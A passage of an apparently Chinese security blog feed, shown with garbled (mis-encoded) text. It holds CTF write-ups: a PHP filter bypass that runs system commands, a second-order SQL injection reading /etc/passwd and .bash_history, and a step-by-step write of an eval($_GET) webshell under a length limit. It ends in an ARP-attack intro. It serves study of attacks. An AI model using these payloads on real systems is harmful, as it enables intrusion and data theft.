class="hljs-comment">//è¿™é‡Œæ˜¯b,aå¤šæäº¤çš„å‚æ•°ï¼Œä¸ä¼šè¢«æ£€æµ‹ è¿™é‡Œçš„[]å¯ä»¥ä½¿ç”¨&#123;&#125;ä»£æ›¿</span></code></pre></div><p>ä¸‹é¢çš„å…·ä½“å·¥ä½œå°±æ˜¯å¦‚ä½•åˆ©ç”¨ä¸Šé¢æä¾›çš„å‡½æ•°æ„é€ å‡º <code>_GET</code>ï¼Œå¹¶ä¸”èƒ½å¤Ÿç»•è¿‡æ£€æµ‹ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹å‡½æ•°çš„ç™½åå•é‡Œç»™äº†å“ªäº›å¯ä»¥ç”¨çš„å‡½æ•°<strong>base_convert()ï¼Œdechex</strong></p><p>è¿˜æœ‰ä¸€äº›çŸ­çš„å‡½æ•°åpi,cos,sin,tanç­‰ï¼Œå› ä¸ºé™åˆ¶äº†é•¿åº¦ï¼Œæ‰€ä»¥è¦å°½é‡ä½¿ç”¨çŸ­çš„å‡½æ•°åä»£æ›¿aå’Œb</p><p><img src="https://i.loli.net/2020/12/05/GnP1emRYpJDd2Q6.png" srcset="/img/loading.gif" alt="base_convert"></p><p><img src="https://i.loli.net/2020/12/05/TsrCzK3hAl4ufEm.png" srcset="/img/loading.gif" alt="dechex"></p><p>å¼€å§‹çš„æƒ³æ³•å°±æ˜¯å°†åˆ©ç”¨base_canvert()ï¼Œè½¬åŒ–å‡ºä¸€ä¸ª_GETï¼Œä½†æ˜¯å‘ç°base_convert()ä¸æ”¯æŒ_ï¼Œå¹¶ä¸”è½¬æ¢å‡ºçš„å­—ç¬¦æ˜¯å°å†™çš„</p><p><img src="https://i.loli.net/2020/12/05/9G4zKrO2HMoc1vN.png" srcset="/img/loading.gif" alt="image-20201205215546962"></p><p>æ‰€ä»¥è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªä¸­é—´è¿‡æ¸¡çš„å‡½æ•°hex2bin()ï¼Œä¸ä¹‹åŠŸèƒ½æƒ³åçš„å‡½æ•°æ˜¯bin2hex()</p><p><img src="https://i.loli.net/2020/12/05/JeivVF1qO8YyRmK.png" srcset="/img/loading.gif" alt="image-20201205220057762"></p><p>å®ç°æ–¹æ³•å¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/12/05/FVMbzCNOwkIsnWd.png" srcset="/img/loading.gif" alt="image-20201205215938937"></p><p>ä¸‹é¢å°±æ˜¯å°†_GETè½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°å­—</p><div class="hljs"><pre><code class="hljs gams"><span class="hljs-comment">//bin2hex("_GET")-&gt;5f474554</span>?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-number">5</span>f474554);(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag</code></pre></div><p>æƒ³æ³•æ˜¯å¥½çš„ï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½ç›´æ¥æäº¤ï¼Œå› ä¸ºä¸ç¬¦åˆä¸Šé¢çš„å‡ ç§å‡½æ•°ä½¿ç”¨çš„æ ¼å¼</p><p>æ‰€ä»¥å°±è¦æƒ³åŠæ³•ä½¿ç”¨ä¸€ä¸ªå‡½æ•°æŠŠ<code>5f474554</code>æäº¤ä¸Šå»</p><p>è¿™é‡Œç”¨çš„æ˜¯dechexï¼Œå°±æ˜¯å°†åè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ï¼Œå†äº¤ç»™hex2binå‡ºæ¥</p><p>æ‰€ä»¥è¿™é‡Œæœ‰ä¸ªé€†è¿‡ç¨‹å°±æ˜¯å°†<code>5f474554</code>è½¬æ¢ä¸ºåè¿›åˆ¶</p><div class="hljs"><pre><code class="hljs 1c">intval('5f<span class="hljs-number">474554</span>',<span class="hljs-number">16</span>);</code></pre></div><p>æ‰€ä»¥å…·ä½“çš„payloadå¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs gams">?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag<span class="hljs-comment">//base_convert(37907361743,10,36)=&gt;hex2bin</span><span class="hljs-comment">//dechex(1598506324)=&gt;5f474554</span><span class="hljs-comment">//hex2bin('5f474554')=&gt;_GET</span><span class="hljs-comment">//$pi=_GET</span><span class="hljs-comment">//($_GET)&#123;1&#125;($_GET&#123;2&#125;)</span></code></pre></div><p>7åˆ†çš„é¢˜ç›®æœç„¶ä¸ä¸€æ ·ï¼Œçœ‹wpéƒ½å†™äº†å¥½ä¹…</p><p>æ—¢ç„¶æ²¡æœ‰èƒ½åŠ›è‡ªå·±åšå‡ºæ¥ï¼Œé‚£å°±å¥½å¥½ç ”ç©¶ä¸€ä¸‹åˆ«äººåšé¢˜çš„æ€è·¯ï¼Œä»¥ä¾¿ä»¥åé‡åˆ°ç±»ä¼¼é¢˜ç›®èƒ½å¤Ÿæœ‰æ€è·¯ã€‚</p><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><h3 id="0x1æ‰«æç›®å½•"><a href="#0x1æ‰«æç›®å½•" class="headerlink" title="0x1æ‰«æç›®å½•"></a>0x1æ‰«æç›®å½•</h3><p>æ‹¿åˆ°é¢˜ç›®æ‰« ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æ˜¯å‡ºç°.gitï¼Œé‚£åº”è¯¥å°±æ˜¯gitæºç æ³„éœ²ï¼Œå¯æ˜¯githackerä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å¥½åƒä¸å…¨ï¼Œçœ‹äº†çœ‹å¤§ä½¬çš„wp</p><p>æš‚æ—¶æ²¡ææ‡‚æ˜¯æ€ä¹ˆä¸‹è½½çš„ï¼Œæ—¥åå†çœ‹ç»†çœ‹</p><p>æºç å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">"mysql.php"</span>;session_start();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'login'</span>] != <span class="hljs-string">'yes'</span>)&#123;    header(<span class="hljs-string">"Location: ./login.php"</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'do'</span>]))&#123;<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">'do'</span>])&#123;<span class="hljs-keyword">case</span> <span class="hljs-string">'write'</span>:    $category = addslashes($_POST[<span class="hljs-string">'category'</span>]);    $title = addslashes($_POST[<span class="hljs-string">'title'</span>]);    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);    $sql = <span class="hljs-string">"insert into board</span><span class="hljs-string">            set category = '$category',</span><span class="hljs-string">                title = '$title',</span><span class="hljs-string">                content = '$content'"</span>;    $result = mysql_query($sql);    header(<span class="hljs-string">"Location: ./index.php"</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">'comment'</span>:    $bo_id = addslashes($_POST[<span class="hljs-string">'bo_id'</span>]);    $sql = <span class="hljs-string">"select category from board where id='$bo_id'"</span>;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;    $category = mysql_fetch_array($result)[<span class="hljs-string">'category'</span>];    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);    $sql = <span class="hljs-string">"insert into comment</span><span class="hljs-string">            set category = '$category',</span><span class="hljs-string">                content = '$content',</span><span class="hljs-string">                bo_id = '$bo_id'"</span>;    $result = mysql_query($sql);    &#125;    header(<span class="hljs-string">"Location: ./comment.php?id=$bo_id"</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:    header(<span class="hljs-string">"Location: ./index.php"</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;    header(<span class="hljs-string">"Location: ./index.php"</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å¯ä»¥çœ‹åˆ°åœ¨writeéƒ¨åˆ†æäº¤çš„éƒ½æ˜¯ç»è¿‡è½¬ä¹‰åå¸¦å…¥æŸ¥è¯¢è¯­å¥æŸ¥è¯¢çš„ï¼Œä½†æ˜¯ä¸‹é¢çš„commentä¸­categoryæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤å°±å¸¦å…¥äº†sqlè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œè¿™å°±å¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><h3 id="0x2äºŒæ¬¡æ³¨å…¥"><a href="#0x2äºŒæ¬¡æ³¨å…¥" class="headerlink" title="0x2äºŒæ¬¡æ³¨å…¥"></a>0x2äºŒæ¬¡æ³¨å…¥</h3><p>è¿›å…¥é¢˜ç›®å¯ä»¥æäº¤è¯„è®ºï¼Œä½†æ˜¯è¦ç™»å½•ï¼Œç»™äº†æç¤º</p><div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>zhangwei<span class="hljs-symbol">password:</span>zhangwei***</code></pre></div><p>ä½¿ç”¨bpçˆ†ç ´å‡ºçš„å¯†ç æ˜¯zhangwei666</p><p><img src="https://i.loli.net/2020/12/07/8Xx35WQfTARLcnz.png" srcset="/img/loading.gif" alt="image-20201207093624672"></p><p>ç™»å½•åå…ˆè¿›å…¥å‘å¸–çš„ç•Œé¢,æ„é€ payload</p><div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div><p>ä¹‹å‰sqlæ³¨å…¥æ–¹æ³•ä¸­ç»å¸¸ä½¿ç”¨çš„æ³¨é‡Šæ–¹æ³•éƒ½æ˜¯å½“è¡Œæ³¨é‡Šï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®çš„æŸ¥è¯¢ä½¿ç”¨çš„æ˜¯å¤šè¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ³¨é‡Šä¹Ÿéœ€è¦ä½¿ç”¨å¤šè¡Œæ³¨é‡Š  /**/ </p><p>åœ¨è¿™é‡Œæ³¨å…¥çš„sqlè¯­å¥ï¼Œåœ¨commenté¡µé¢ä¼šè¢«sqlé‡æ–°è°ƒå‡ºæ¥ï¼Œä»è€Œæ‰§è¡Œäº†æ³¨å…¥è¯­å¥ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºå•¥å«åšäºŒæ¬¡æ³¨å…¥</p><p>äºæ˜¯æ„é€ çš„sqlè¯­å¥å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,                content &#x3D; &#39;*&#x2F;#&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div><p>å› ä¸ºä¸­é—´çš„ cntentè¢«åŒ…å›´åœ¨å¤šè¡Œæ³¨é‡Šä¸­é—´ï¼Œæ‰€ä»¥è¿™é‡Œä¸èµ·ä½œç”¨ç­‰ä»·äº</p><div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;&#39;,content&#x3D;user(),                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div><p>å½“åœ¨è¯„è®ºé¡µé¢è¯„è®º<code>*/#</code>æ—¶ï¼Œä¼šä¸ä¹‹å‰çš„<code>/*</code>çš„è¿›è¡Œé—­åˆï¼Œå°±å¤Ÿé€ å‡ºäº†æˆ‘ä»¬æƒ³è¦çš„sqlè¯­å¥ï¼Œuser()è¿™ä¸ªsqlå‡½æ•°å°±ä¼šè¢«æ‰§è¡Œï¼Œæ˜¾ç¤ºå½“å‰çš„ç”¨æˆ·</p><p><img src="https://i.loli.net/2020/12/07/DEre87viLhH6Aby.png" srcset="/img/loading.gif" alt="image-20201207094017109"></p><p> åŸç†çŸ¥é“äº†ï¼Œä¸‹é¢å°±æ˜¯å…·ä½“çš„åšè¿™ä¸ªé¢˜ç›®</p><p>é¦–å…ˆè¯»å– <strong>/etc/passwd</strong> çœ‹çœ‹æœåŠ¡å™¨ä¸Šæœ‰å“ªäº›ç”¨æˆ·ï¼Œpayloadä¸º: <strong>â€˜,content=(select load_file(â€˜/etc/passwdâ€™)),/*</strong></p><p><img src="https://i.loli.net/2020/12/07/rg5k8mAsKST3hea.png" srcset="/img/loading.gif" alt="image-20201207094741282"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰wwwç”¨æˆ·çš„ï¼Œé‚£ä¹ˆä¹…å­˜åœ¨<strong>.bash_history</strong> è®°å½•ï¼Œç»§ç»­æŸ¥çœ‹</p><div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span>.<span class="hljs-params">bash_history</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div><p><img src="https://i.loli.net/2020/12/07/7YDFXWbGHcxNqAk.png" srcset="/img/loading.gif" alt="image-20201207094934593"></p><p>ä¹Ÿå°±æ˜¯ä»¥ä¸‹å‡ æ¡æŒ‡ä»¤</p><div class="hljs"><pre><code class="hljs routeros">cd  /tmp/ unzip html.ziprm -f html.zipcp -r html /var/www/cd  /var/www/html/rm -f .DS_Storeservice apache2 start</code></pre></div><p>å¯ä»¥çœ‹å‡ºæ¥ <code>.Ds_Store</code>æ˜¯å­˜åœ¨/tmp/htmlç›®å½•ä¸‹çš„ï¼Œé‚£å°±çœ‹çœ‹æœ‰ä»€ä¹ˆ</p><p>ç›´æ¥æŸ¥çœ‹è¯¥æ–‡ä»¶ä¼šå‘ç°é•¿åº¦ä¸å¤Ÿï¼Œè€Œä¸”æ˜¾ç¤ºä¸å¯è§å­—ç¬¦</p><p><img src="https://i.loli.net/2020/12/07/Bl5n6KNOTUdGb1Z.png" srcset="/img/loading.gif" alt="image-20201207095822022"></p><p>ä½¿ç”¨hex()å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜</p><div class="hljs"><pre><code class="hljs sql">title=1&amp;category=',content=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>( <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/tmp/html/.DS_Store'</span>))),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div><p>åœ¨çº¿è§£ç åå¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼Œå­˜åœ¨ä¸€ä¸ª <code>flag_8946e1ff1ee3e40f.php</code></p><p><img src="/2020/11/30/adworld/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201207100157447.png" srcset="/img/loading.gif" alt="image-20201207100157447"></p><p>æŸ¥çœ‹flagï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä» /var/www/html/ä¸­å¤åˆ¶è¿‡æ¥çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦åˆ°é‚£ä¸ªç›®å½•è¯»å–</p><div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select hex( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">flag_8946e1ff1ee3e40f</span>.<span class="hljs-params">php</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div><p><img src="https://i.loli.net/2020/12/07/Ce9WJYTFU5HMrOp.png" srcset="/img/loading.gif" alt="image-20201207101235024"></p><p>åœ¨çº¿è§£ç å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rce</title>
    <link href="/2020/11/29/rcm/"/>
    <url>/2020/11/29/rcm/</url>
    
    <content type="html"><![CDATA[<p>çœ‹åˆ°ä¸€ä¸ªå…³äºä»»æ„å‘½ä»¤æ‰§è¡Œçš„è§†é¢‘åæ„Ÿè§‰å¾ˆæœ‰æ„æ€ï¼Œå¯ä»¥è®°å½•ä»¥ä¸‹ï¼Œä»¥åå¯èƒ½ä¼šç”¨åˆ°ã€‚</p><a id="more"></a><h1 id="phpä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°"><a href="#phpä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°" class="headerlink" title="phpä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°"></a>phpä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„å¸¸è§å‡½æ•°</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system('ls', $return_var);</span><span class="hljs-keyword">system</span>() ä¼šå°†è¾“å‡ºå†…å®¹ç›´æ¥å°å‡º, æ‰€ä»¥è‹¥äºç½‘é¡µ, ä¼šå°†æ‰€æœ‰å›ä¼ å†…å®¹éƒ½æ˜¾ç¤ºäºé¡µé¢ä¸Š.<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: åªèƒ½å–å¾—æœ€åä¸€è¡Œçš„å†…å®¹</span><span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: å–å¾—ç³»ç»ŸçŠ¶æ€å›ä¼ ç </span></code></pre></div><h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec('ls');</span><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: å›ä¼ å†…å®¹éƒ½ä¼šå­˜äºæ­¤å˜æ•°ä¸­(å‚¨å­˜æˆçº¯æ–‡å­—å†…å®¹), ä¸ä¼šç›´æ¥ç§€åœ¨é¡µé¢ä¸Š.</span></code></pre></div><h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><div class="hljs"><pre><code class="hljs gams">exec(<span class="hljs-string">'ls'</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: å›ä¼ å†…å®¹éƒ½ä¼šå­˜äºæ­¤å˜æ•°ä¸­(å‚¨å­˜æˆé˜µåˆ—), ä¸ä¼šç›´æ¥ç§€åœ¨é¡µé¢ä¸Š.</span><span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: å–å¾—ç³»ç»ŸçŠ¶æ€å›ä¼ ç </span></code></pre></div><h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>evalæ‰§è¡Œå‘½ä»¤çš„åŸç†ä¸ä¸Šé¢å‡ ä¸ªä¸åŒï¼Œeval ä¼šæŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</p><p>ä¾‹å¦‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">"phpinfo();"</span>);<span class="hljs-keyword">eval</span>(<span class="hljs-string">"system('dir');"</span>);<span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo 'hello!';"</span>);<span class="hljs-comment">//æ³¨æ„ï¼šå› ä¸ºæ˜¯å°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥ç›¸å½“äºåŒå¼•å·ä¸­çš„ä»£ç å†æ¬¡æ‰§è¡Œäº†ä¸€æ¬¡ï¼Œæ‰€ä»¥é‡Œé¢çš„ä»£ç ä¸€å®šè¦ç¬¦åˆphpè¯­æ³•è§„åˆ™</span></code></pre></div><h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">phpå®˜æ–¹æ‰‹å†Œ</a></p><p>ç”¨æ³•å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs autoit">$a = <span class="hljs-string">'system'</span><span class="hljs-comment">;</span>$b = <span class="hljs-string">'dir'</span><span class="hljs-comment">;</span>$c = <span class="hljs-string">'assert'</span><span class="hljs-comment">;</span>$d = <span class="hljs-string">'phpinfo()'</span><span class="hljs-comment">;</span>call_user_func($a,$b)<span class="hljs-comment">;</span>call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div><h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><div class="hljs"><pre><code class="hljs php">$a = create_function(<span class="hljs-string">'$code'</span>,<span class="hljs-string">'echo $code;'</span>);$b = <span class="hljs-string">'hello'</span>;$a($b);$a = <span class="hljs-string">'phpinfo();'</span>;$b = create_function(<span class="hljs-string">''</span>,$a);$b();<span class="hljs-comment">//å’Œä¸‹é¢ä¸¤ä¸ªå®šä¹‰çš„å‡½æ•°ä½œç”¨ç›¸åŒ</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">($b)</span></span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'$b'</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span><span class="hljs-params">()</span></span>&#123;    phpinfo();&#125;</code></pre></div><h1 id="é™åˆ¶å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#é™åˆ¶å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="é™åˆ¶å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"></a>é™åˆ¶å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ</h1><p>å®éªŒç¯å¢ƒä¸ºubuntu nginx+php5.5</p><p>å®éªŒç›®çš„</p><p>é€šè¿‡å‘½ä»¤æ‰§è¡Œæƒ³æœåŠ¡å™¨å†™å…¥ä¸€å¥è¯æœ¨é©¬è€Œè¾¾åˆ°æ§åˆ¶æœåŠ¡å™¨çš„ç›®çš„</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(strlen($_GET[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;    <span class="hljs-keyword">echo</span> strlen($_GET[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">echo</span> shell_exec($_GET[<span class="hljs-number">1</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"It's too long!"</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>é™åˆ¶äº†å‚æ•°1çš„å­—ç¬¦é•¿åº¦ä¸º15</p><p>ç„¶åå°†ä¼ é€’çš„å‚æ•°æ”¾åˆ°shell_execä¸­æ‰§è¡Œ</p><p>çªç ´ç‚¹å°±æ˜¯åˆ©ç”¨shell_execå‡½æ•°å°†ï¼Œæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†™å…¥åˆ°ä¸€ä¸ªphpæ–‡ä»¶ä¸­ï¼Œè·å–shellã€‚</p><p>æ‰€ä»¥æƒ³è¦å¤Ÿçš„payloadçš„ä¸º</p><div class="hljs"><pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre></div><p>å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥åˆ°1.phpä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬æœ€çŸ­å­—ç¬¦é•¿åº¦åº”è¯¥ä¸º21 ï¼Œè¿™æ˜¾ç„¶ä¸èƒ½è¾¾åˆ°14ä¸ªå­—ç¬¦çš„é™åˆ¶è¦æ±‚</p><p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" srcset="/img/loading.gif" alt="muma.png"></p><p>å¯ä»¥ä½¿ç”¨<code>echo text &gt;&gt;tmp.txt</code></p><p>å°†å­—ç¬¦ä¸²è¾“å‡ºè¿½åŠ é‡å®šå‘ï¼Œå½“å‰ç›®å½•å­˜åœ¨tmp.txtï¼Œåˆ™å°†tmp.txtçš„å†…å®¹åé¢è¿½åŠ è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œä¼šæ¢è¡Œ</p><p>ä¾‹å¦‚ä¸‹é¢</p><p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" srcset="/img/loading.gif" alt="echo.png"></p><p>å­—ç¬¦é™åˆ¶è§£å†³äº†ï¼Œé‚£ä¹ˆå¾—çŸ¥é“æ¢è¡Œåphpä»£ç è¿˜èƒ½æ­£å¸¸æ‰§è¡Œå—ï¼Œæœ¬åœ°éªŒè¯å‘ç°æ˜¯æ²¡é—®é¢˜çš„</p><p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" srcset="/img/loading.gif" alt="yanzheng.png"></p><p>ä¸‹é¢å°±å¯ä»¥åšè¿™ä¸ªé¢˜ç›®äº†</p><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-comment">//ä¸ºäº†æ¯æ¬¡å†™å…¥æ›´å¤šçš„å­—ç¬¦å¯ä»¥åˆ©ç”¨æ— åç¼€åçš„æ–‡ä»¶ï¼Œæœ€åç”¨mvå°†å…¶æ”¹ä¸ºphpæ–‡ä»¶</span>?<span class="hljs-number">1</span>=echo \&lt;\?php &gt;<span class="hljs-number">1</span>?<span class="hljs-number">1</span>=echo eval\( &gt;&gt;<span class="hljs-number">1</span>?<span class="hljs-number">1</span>=echo \$_GET &gt;&gt;<span class="hljs-number">1</span>?<span class="hljs-number">1</span>=echo \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>?<span class="hljs-number">1</span>=echo \)\; &gt;&gt;<span class="hljs-number">1</span> ?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre></div><p>ä¹‹åè®¿é—®1.phpæäº¤å‚æ•°ï¼Œè·å–æƒ³è¦çš„å†…å®¹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cmd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp attack</title>
    <link href="/2020/11/27/attack/"/>
    <url>/2020/11/27/attack/</url>
    
    <content type="html"><![CDATA[<h1 id="arpæ”»å‡»"><a href="#arpæ”»å‡»" class="headerlink" title="arpæ”»å‡»"></a>arpæ”»å‡»</h1><p>ARPï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®æ˜¯ä¸€ä¸ªä½äº<a href="https://baike.baidu.com/item/TCP%2FIPåè®®" target="_blank" rel="noopener">TCP/IPåè®®</a>æ ˆä¸­çš„ç½‘ç»œå±‚ï¼Œè´Ÿè´£å°†æŸä¸ª<a href="https://baike.baidu.com/item/IPåœ°å€" target="_blank" rel="noopener">IPåœ°å€</a>è§£ææˆå¯¹åº”çš„<a href="https://baike.baidu.com/item/MACåœ°å€" target="_blank" rel="noopener">MACåœ°å€</a>ã€‚</p><a id="more"></a><p>ARP ç—…æ¯’æ”»å‡»æ˜¯<a href="https://baike.baidu.com/item/å±€åŸŸç½‘/98626" target="_blank" rel="noopener">å±€åŸŸç½‘</a>æœ€å¸¸è§çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚ç”±äºTCP/IPåè®®å­˜åœ¨çš„ä¸€äº›æ¼æ´ç»™ARPç—…æ¯’æœ‰è¿›è¡Œæ¬ºéª—æ”»å‡»çš„æœºä¼šï¼ŒARPåˆ©ç”¨TCP/IPåè®®çš„æ¼æ´è¿›è¡Œæ¬ºéª—æ”»å‡»ï¼Œç°å·²ä¸¥é‡å½±å“åˆ°äººä»¬æ­£å¸¸<a href="https://baike.baidu.com/item/ä¸Šç½‘/217407" target="_blank" rel="noopener">ä¸Šç½‘</a>å’Œ<a href="https://baike.baidu.com/item/é€šä¿¡/300982" target="_blank" 